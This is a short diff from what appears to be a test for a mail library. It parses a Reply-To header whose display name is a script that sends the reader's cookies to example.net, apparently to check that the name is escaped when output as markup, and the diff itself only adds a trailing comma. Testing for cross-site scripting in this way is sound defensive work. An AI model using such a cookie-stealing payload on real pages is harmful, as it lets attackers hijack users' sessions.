@@ -9,7 +9,7 @@ use Core\Mail\Message;
 
 // 1. The name is a script that sends the reader's cookies to another site.
 Message $mail = Message::parse(
-    "Reply-To: \"<script>fetch('https://example.net/?c=' + document.cookie)</script>\" <x@example.net>\r\n\r\nHi"
+    "Reply-To: \"<script>fetch('https://example.net/?c=' + document.cookie)</script>\" <x@example.net>\r\n\r\nHi",
 );
 Markup $page = $mail->replyTo()[0]->name();
 echo $page, "\n";
